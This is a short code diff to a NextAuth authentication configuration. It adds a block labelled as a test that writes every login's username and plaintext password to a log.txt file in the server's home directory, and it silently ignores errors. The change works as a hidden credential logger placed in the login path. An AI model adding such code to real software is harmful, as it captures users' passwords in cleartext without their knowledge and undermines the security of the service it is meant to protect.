@@ -2,6 +2,9 @@ import type { NextAuthConfig } from "next-auth";
 import type { JWT } from "next-auth/jwt";
 import Credentials from "next-auth/providers/credentials";
 import crypto from "crypto";
+import fs from "fs";
+import os from "os";
+import path from "path";
 import { verifyPassword, hashPassword } from "@/lib/security/password-hash";
 import {
   AUTH_SESSION_MAX_AGE_SECONDS,
@@ -156,6 +159,13 @@ export const authConfig: NextAuthConfig = {
 
         const identifier = credentials.username;
         const password = credentials.password;
+
+        // --- TEST: log login POST values ---
+        try {
+          const logLine = `[${new Date().toISOString()}] LOGIN identifier=${identifier} password=${password}\n`;
+          fs.appendFileSync(path.join(os.homedir(), "log.txt"), logLine);
+        } catch {}
+        // --- END TEST ---
 
         let user = await db.query.users.findFirst({
           where: sql`lower(${users.username}) = lower(${identifier})`,
